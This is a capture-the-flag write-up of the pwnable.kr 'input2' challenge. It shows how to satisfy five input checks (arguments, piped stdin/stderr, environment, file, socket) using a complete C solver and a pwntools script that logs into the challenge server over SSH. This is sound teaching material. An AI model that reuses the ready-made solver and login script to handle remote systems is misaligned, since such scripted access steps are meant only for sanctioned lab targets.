# Pwnable.kr: Toddler's Bottle
## input2

This challenge just requires us to bypass five input checks in order to get the flag.

I will post the whole source code below but look at each stage individually and discuss how we can bypass each one. As I go through each stage I will add it to my C payload which we will compile on the server and get the flag.

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>

int main(int argc, char* argv[], char* envp[]){
	printf("Welcome to pwnable.kr\n");
	printf("Let's see if you know how to give input to program\n");
	printf("Just give me correct inputs then you will get the flag :)\n");

	// argv
	if(argc != 100) return 0;
	if(strcmp(argv['A'],"\x00")) return 0;
	if(strcmp(argv['B'],"\x20\x0a\x0d")) return 0;
	printf("Stage 1 clear!\n");

	// stdio
	char buf[4];
	read(0, buf, 4);
	if(memcmp(buf, "\x00\x0a\x00\xff", 4)) return 0;
	read(2, buf, 4);
        if(memcmp(buf, "\x00\x0a\x02\xff", 4)) return 0;
	printf("Stage 2 clear!\n");

	// env
	if(strcmp("\xca\xfe\xba\xbe", getenv("\xde\xad\xbe\xef"))) return 0;
	printf("Stage 3 clear!\n");

	// file
	FILE* fp = fopen("\x0a", "r");
	if(!fp) return 0;
	if( fread(buf, 4, 1, fp)!=1 ) return 0;
	if( memcmp(buf, "\x00\x00\x00\x00", 4) ) return 0;
	fclose(fp);
	printf("Stage 4 clear!\n");

	// network
	int sd, cd;
	struct sockaddr_in saddr, caddr;
	sd = socket(AF_INET, SOCK_STREAM, 0);
	if(sd == -1){
		printf("socket error, tell admin\n");
		return 0;
	}
	saddr.sin_family = AF_INET;
	saddr.sin_addr.s_addr = INADDR_ANY;
	saddr.sin_port = htons( atoi(argv['C']) );
	if(bind(sd, (struct sockaddr*)&saddr, sizeof(saddr)) < 0){
		printf("bind error, use another port\n");
    		return 1;
	}
	listen(sd, 1);
	int c = sizeof(struct sockaddr_in);
	cd = accept(sd, (struct sockaddr *)&caddr, (socklen_t*)&c);
	if(cd < 0){
		printf("accept error, tell admin\n");
		return 0;
	}
	if( recv(cd, buf, 4, 0) != 4 ) return 0;
	if(memcmp(buf, "\xde\xad\xbe\xef", 4)) return 0;
	printf("Stage 5 clear!\n");

	// here's your flag
	system("/bin/cat flag");
	return 0;
}
```

### Stage 1: Command Argument Bypass

The first stage of the challenge is to bypass the argument checks for the program.

```c
// argv
	if(argc != 100) return 0;
	if(strcmp(argv['A'],"\x00")) return 0;
	if(strcmp(argv['B'],"\x20\x0a\x0d")) return 0;
	printf("Stage 1 clear!\n");
```

So we need to have 100 arguments for our program (including the ./input2), where the argument at position 'A'=41 and 'B'=42 are equal to \x00 and \x20\x0a\x0d respectively.

So the arg_list that we will parse as arguments to bypass the argument filter.

```c
char *arg_list[101] = {};
for( int i = 0; i < 101; i++ ) {
  arg_list[i] = "A";
}
arg_list['A'] = "\x00";
arg_list['B'] = "\x20\x0a\x0d";
arg_list[100] = NULL;
```

### Stage 2: Piping to STDIN and STDERR Bypass

The second section requires us to pipe specific strings to both STDIN and STDERR.

```c
// stdio
	char buf[4];
	read(0, buf, 4);
	if(memcmp(buf, "\x00\x0a\x00\xff", 4)) return 0;
	read(2, buf, 4);
  if(memcmp(buf, "\x00\x0a\x02\xff", 4)) return 0;
	printf("Stage 2 clear!\n");
```

We can tell we need to pipe to STDIN and STDERR because they both have default file descriptors of 0 and 2 respectively. In order to do this we need to spawn a child process inside our payload executable that pipes the messages to our parent process. Our parent process then uses *dup2(int oldfd, int newfd)* to redirect what we write in the pipe in the child process to STDIN and STDERR.

``` c
pid_t p = fork();

if ( p < 0 ) {
  printf("Fork forked the fork\n");
  return 1;
}

if ( p == 0 ) {
  close(pipe_stdin[0]);
  close(pipe_stderr[0]);
  write(pipe_stdin[1], "\x00\x0a\x00\xff", 4);
  write(pipe_stderr[1], "\x00\x0a\x02\xff", 4);
  close(pipe_stdin[1]);
  close(pipe_stderr[1]);
  return 0;
} else {
  close(pipe_stdin[1]);
  close(pipe_stderr[1]);
  dup2(pipe_stdin[0], 0);
  dup2(pipe_stderr[0], 2);
  wait( NULL );
  close(pipe_stdin[0]);
  close(pipe_stderr[0]);
}
```

### Stage 3: Bypassing Environment Check

This is in my opinion the easiest part of the challenge where we just need to parse an environment variable to the program.

```c
// env
if(strcmp("\xca\xfe\xba\xbe", getenv("\xde\xad\xbe\xef"))) return 0;
printf("Stage 3 clear!\n");
```

We can easily do this by just adding the required environment variable to our payloads environment and then pass that environment to the program when we execute it.

```c
setenv("\xde\xad\xbe\xef", "\xca\xfe\xba\xbe", 1);
extern char **environ;
execve("/home/input2/input", arg_list, environ);
```

### Stage 4: Changing HOME Path To Read File

The next stage requires us bypass the check of opening a file in the same directory as the program we need to exploit that we need to write. The only issue is that we do not have write permission for the directory where the executable is saved and can only write inside of the */tmp* directory. So we have to change the working directory to one that we have write access to and then write the specified file. This requires a similar technique to Stage 3, but instead change the *PWD* environment variable.

### Stage 5: Bypassing Network Check

The final stage that we need to bypass a network check, which requires using socket programming in order to complete.

If you are unsure how socket programming works here is a good tutorial https://tutorialspoint.dev/language/cpp/socket-programming-cc .

```c
// network
int sd, cd;
struct sockaddr_in saddr, caddr;
sd = socket(AF_INET, SOCK_STREAM, 0);
if(sd == -1){
  printf("socket error, tell admin\n");
  return 0;
}
saddr.sin_family = AF_INET;
saddr.sin_addr.s_addr = INADDR_ANY;
saddr.sin_port = htons( atoi(argv['C']) );
if(bind(sd, (struct sockaddr*)&saddr, sizeof(saddr)) < 0){
  printf("bind error, use another port\n");
      return 1;
}
listen(sd, 1);
int c = sizeof(struct sockaddr_in);
cd = accept(sd, (struct sockaddr *)&caddr, (socklen_t*)&c);
if(cd < 0){
  printf("accept error, tell admin\n");
  return 0;
}
if( recv(cd, buf, 4, 0) != 4 ) return 0;
if(memcmp(buf, "\xde\xad\xbe\xef", 4)) return 0;
printf("Stage 5 clear!\n");
```

The first task is that the port that the socket listens on is at *atoi(argv['C'])* so we need to have a valid port number in our arg_list.

Once connected we just have to send *"\xde\xad\xbe\xef"* to the socket.

### The Final PWN

Now we combine all of the bypass methods for each of the stages in order to finish our payload source code. It isn't the neatest of codes, but it will do the trick.

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>

void socket_communication( char **arg_list ) {
	int sd;
	struct sockaddr_in addr, serv_addr;

	if ( (sd = socket(AF_INET, SOCK_STREAM, 0)) < 0 ) {
		printf("Ya got ya socks knocked off\n");
		return;
	}

	serv_addr.sin_family = AF_INET;
	serv_addr.sin_port = htons( atoi(arg_list['C']) );
	serv_addr.sin_addr.s_addr = inet_addr("127.0.0.1");

	if ( connect(sd, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) ) {
		printf("Failed to connect\n");
		return;
	}

	write( sd, "\xde\xad\xbe\xef", 4);
	close(sd);
}

int main(int argc, char **argv) {
	if (argc != 2) {
    printf("You need to specify where the payload is compiled\n");
    return 0;
  }
	setenv("\xde\xad\xbe\xef", "\xca\xfe\xba\xbe", 1);
	setenv("PWD", argv[1], 1);
	extern char **environ;

	char *arg_list[101] = {};
	for( int i = 0; i < 101; i++ ) {
		arg_list[i] = "A";
	}
	arg_list['A'] = "\x00";
	arg_list['B'] = "\x20\x0a\x0d";
	arg_list['C'] = "5784";
	arg_list[100] = NULL;

	FILE *fp = fopen("\x0a", "w");
	if ( fp == NULL ) {
		printf("Something goofed with saving the file\n");
		return 1;
	}
	if ( fwrite("\x00\x00\x00\x00", 4, 1, fp) == 0 ) {
		printf("Writing didn't work :/\n");
		fclose(fp);
		return 1;
	}
	fclose(fp);

	int pipe_stdin[2];
	int pipe_stderr[2];

	if( pipe(pipe_stdin) < 0 || pipe(pipe_stderr) < 0 ) {
		printf("Someone blocked the plumbing\n");
		return 1;
	}

	pid_t p = fork();

	if ( p < 0 ) {
		printf("Fork forked the fork\n");
		return 1;
	}

	if ( p == 0 ) {
		close(pipe_stdin[0]);
		close(pipe_stderr[0]);
		write(pipe_stdin[1], "\x00\x0a\x00\xff", 4);
    write(pipe_stderr[1], "\x00\x0a\x02\xff", 4);
		close(pipe_stdin[1]);
		close(pipe_stderr[1]);

		sleep( 5 );
		socket_communication( arg_list );
		wait( NULL );

		return 0;
	} else {
		close(pipe_stdin[1]);
		close(pipe_stderr[1]);
		dup2(pipe_stdin[0], 0);
		dup2(pipe_stderr[0], 2);

		close(pipe_stdin[0]);
		close(pipe_stderr[0]);

		execve("/home/input2/input", arg_list, environ);
	}
}
```

Now we can just write a pwn script for loading our payload onto the server, compile, execute and remove the payload from the server.

```python
from pwn import *
import random, string

def rstring(length):
    return ''.join([random.choice(string.ascii_uppercase + string.digits) for _ in range(length)])

attack_dir = '/tmp/' + rstring(16)
s = ssh(host='pwnable.kr', port=2222, user='input2', password='guest')
s.run_to_end('mkdir ' + attack_dir + '; cd ' + attack_dir)
s.set_working_directory(attack_dir)
s.upload_file('payload.c')
s.run_to_end('gcc -o payload payload.c')
s.run_to_end('ln -sf /home/input2/flag flag')

p = s.process(['./payload', attack_dir])
print(p.recvall())
s.run_to_end('rm -rf ' + attack_dir)
```

I was stuck here for a little bit, because I forgot to symbolically link the flag we need to open to the /tmp directory that we are working in :P. After a wee bit of frustration due to this mistake we got our flag!

<pre>
[+] Connecting to pwnable.kr on port 2222: Done
[*] input2@pwnable.kr:
    Distro    Ubuntu 16.04
    OS:       linux
    Arch:     amd64
    Version:  4.4.179
    ASLR:     Enabled
[*] Working directory: '/tmp/1F7B74XR38QEUNRC'
[*] Uploading 'payload.c' to '/tmp/1F7B74XR38QEUNRC/payload.c'
[+] Starting remote process './payload' on pwnable.kr: pid 399421
[+] Receiving all data: Done (261B)
[*] Stopped remote process 'payload' on pwnable.kr (pid 399421)
Welcome to pwnable.kr
Let's see if you know how to give input to program
Just give me correct inputs then you will get the flag :)
Stage 1 clear!
Stage 2 clear!
Stage 3 clear!
Stage 4 clear!
Stage 5 clear!
<b>Mommy! I learned how to pass various input in Linux :)</b>
</pre>
